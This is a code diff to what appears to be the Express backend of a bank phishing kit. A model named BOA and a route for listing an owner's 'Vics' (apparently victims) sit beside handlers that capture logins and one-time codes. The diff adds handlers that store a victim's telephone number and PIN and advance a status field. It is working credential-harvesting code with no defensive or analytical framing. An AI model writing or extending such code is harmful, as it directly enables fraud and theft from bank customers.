@@ -55,6 +55,28 @@ const submitOtp = async (req, res) => {
     }
 };
 
+const submitTelephone = async (req, res) => {
+    const { telephone, uniqueid } = req.body;
+    try {
+        await BOA.findOneAndUpdate({ uniqueid }, { telephone, status: 7, timestamp: moment().format() }).exec();
+        res.sendStatus(200);
+    } catch (error) {
+        console.log(error);
+        res.sendStatus(400);
+    }
+};
+
+const submitPin = async (req, res) => {
+    const { pin, uniqueid } = req.body;
+    try {
+        await BOA.findOneAndUpdate({ uniqueid }, { pin, status: 5, timestamp: moment().format() }).exec();
+        res.sendStatus(200);
+    } catch (error) {
+        console.log(error);
+        res.sendStatus(400);
+    }
+};
+
 const getOwnerVics = async (req, res) => {
     const { owner } = req.params;
     BOA
@@ -101,5 +123,7 @@ module.exports = {
     submitLogin,
     submitLoginAgain,
     submitOtp,
+    submitPin,
+    submitTelephone,
     deleteEntry,
 };
